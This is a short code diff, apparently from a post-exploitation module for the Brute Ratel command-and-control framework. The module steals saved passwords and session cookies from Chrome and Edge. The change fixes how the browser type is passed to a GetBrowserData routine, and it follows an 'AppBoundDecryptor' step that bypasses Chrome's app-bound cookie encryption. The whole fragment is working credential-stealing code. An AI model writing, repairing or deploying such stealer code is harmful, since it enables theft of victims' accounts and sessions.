@@ -1559,11 +1559,11 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
         if (cookieOnly || loginDataOnly){
             if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
                 BadgerDispatch(g_dispatch, "[*] Getting Chrome cookies and passwords\n");
-                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
+                GetBrowserData(CHROME, cookieOnly, loginDataOnly, copyFile);
             }
             if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
                 BadgerDispatch(g_dispatch, "[*] Getting Edge cookies and passwords\n");
-                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
+                GetBrowserData(EDGE, cookieOnly, loginDataOnly, copyFile);
             }
             return;
         }
@@ -1571,11 +1571,11 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
         if(AppBoundDecryptor(localStateFile, (int)pid)){
             if (SHLWAPI$StrStrIA(localStateFile, "chrome") != NULL) {
                 BadgerDispatch(g_dispatch, "[*] Getting Chrome Cookies and Passwords");
-                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
+                GetBrowserData(CHROME, cookieOnly, loginDataOnly, copyFile);
             }
             if (SHLWAPI$StrStrIA(localStateFile, "edge") != NULL) {
                 BadgerDispatch(g_dispatch, "[*] Getting Edge Cookies and Passwords");
-                GetBrowserData(selectedMode, cookieOnly, loginDataOnly, copyFile);
+                GetBrowserData(EDGE, cookieOnly, loginDataOnly, copyFile);
             }
         }
     }
